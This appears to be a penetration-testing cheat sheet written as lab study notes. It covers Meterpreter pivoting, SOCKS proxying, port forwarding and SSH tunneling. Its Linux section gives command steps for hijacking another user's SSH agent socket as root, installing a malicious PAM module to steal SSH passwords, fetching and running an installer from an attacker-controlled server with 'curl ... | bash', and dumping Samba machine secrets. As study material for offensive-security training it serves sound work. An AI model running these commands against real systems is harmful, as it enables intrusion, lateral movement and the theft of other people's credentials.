# Meterpreter
#### Route
* * `meterpreter > run autoroute -s 10.2.31.0/24`
    </br> or </br>
* * `route add <10.10.10.0> <255.255.255.0> <session-ID>`
* background meterpreter
* `msf6 > use auxiliary/scanner/portscan/tcp`
* `use auxiliary/server/socks_proxy`
* configure it according with `cat /etc/proxychains.conf`
* `run/exploit` socks_proxy
* in linux host use `proxychains nmap -sT ...`
#### Port forward
* `use auxiliary/scanner/portscan/tcp` - portscan (after running autoroute)
* `meterpreter> portfwd add -l <local_port> -p <target_port> -r <target_IP>`
    * `meterpreter> portfwd list` - check port forwarding list
    * in linux host, run `nmap <local_port>`

__SSH Tunneling__
* `ssh -4 -L 8000:127.0.0.1:3306 sysadmin@demo.ine.local` - forward target port _3306_ to attackers local port _8000_

> [!IMPORTANT]
> * when route is activated and exploiting other hosts through msf pivoting, `reverse_tcp` doesn't work
> * use `bind_tcp` payloads 

# Linux
* __SSH session hijacking__
    * requires **active** SSH session on the target
    * requires **root** 
    * `ps aux | grep sshd` - determine SSH process ID
    * `grep SSH_AUTH_SOCK /proc/<PID>/environ`
    * `SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXX ssh-add -l` - hijack target ssh-agent socket
    * `ssh remotesystem -l <victim>` - log into remote system as victim
* __SSH - stealing credentials__
    * malicious PAM module
    * https://github.com/mthbernardes/sshLooter
    * on attacking machine: edit _install.sh_ and _looter.py_ pointing _url_ variable to a server under attacket control to log POST requests
    * on compromised machine: `curl http://attacker-server/install.sh | bash`
* __Samba secrets__
    * `tdbdump /var/lib/samba/private/secrets.tdb`
    * https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9

# Local Techniques
#### Local Port forward
* `ssh -L <local port to listen on>:<remote machine>:<remote port> <username>@<ssh-server>`

## Cool resources
https://book.hacktricks.xyz/tunneling-and-port-forwarding

